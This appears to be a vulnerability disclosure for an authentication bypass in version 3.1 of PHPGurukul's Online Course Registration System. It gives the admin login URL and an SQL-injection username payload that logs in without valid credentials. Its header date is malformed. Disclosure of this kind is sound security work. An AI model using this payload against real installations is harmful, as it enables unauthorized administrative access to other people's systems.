# Online Course Registration System - Authentication Bypass
+ **Exploit Title:** Online Course Registration System - Authentication Bypass
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/online-course-registration-free-download/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7515
+ **Version:** 3.1
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Course Registration System allows Authentication Bypass via the `username` and `password` parameters at "http://localhost/onlinecourse/admin/". 

## Proof of Concept:
+ Go to this address: "http://localhost/onlinecourse/admin/"
+ username : `'or 1=1-- -` password : `1`  and log in
+ Authentication Bypass Successful !

![Ekran görüntüsü 2024-05-16 114806](https://github.com/BurakSevben/CVEs/assets/117217689/5dce4eba-37ac-4e8e-9aa1-b1dd1651a4ed)


![Ekran görüntüsü 2024-05-16 123427](https://github.com/BurakSevben/CVEs/assets/117217689/3c62b2b1-4138-4627-a24e-414d4e95e4b8)
